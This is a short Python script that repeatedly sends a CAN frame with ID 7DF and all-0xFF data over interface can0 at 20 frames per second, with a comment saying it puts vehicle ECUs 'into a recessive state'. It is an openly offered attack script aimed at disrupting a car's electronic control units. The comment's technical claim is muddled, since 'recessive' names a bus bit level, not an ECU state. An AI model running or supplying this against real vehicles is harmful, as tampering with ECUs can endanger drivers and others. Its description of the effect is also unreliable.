import subprocess
import signal
import sys
import time

# Define the CAN message to put ECUs into a recessive state
message_id = "7DF"
data = "FF FF FF FF FF FF FF FF"
can_interface = "can0"
delay = 1 / 20  # 20 frames per second

# Define a signal handler to gracefully exit the loop on Ctrl+C
def signal_handler(sig, frame):
    print("Exiting...")
    sys.exit(0)

# Set the signal handler for SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)

# Loop to send the CAN message at 20 frames per second until Ctrl+C is pressed
try:
    while True:
        subprocess.run(["cansend", can_interface, f"{message_id}#{data}"])
        time.sleep(delay)
except KeyboardInterrupt:
    print("Ctrl+C detected. Exiting...")
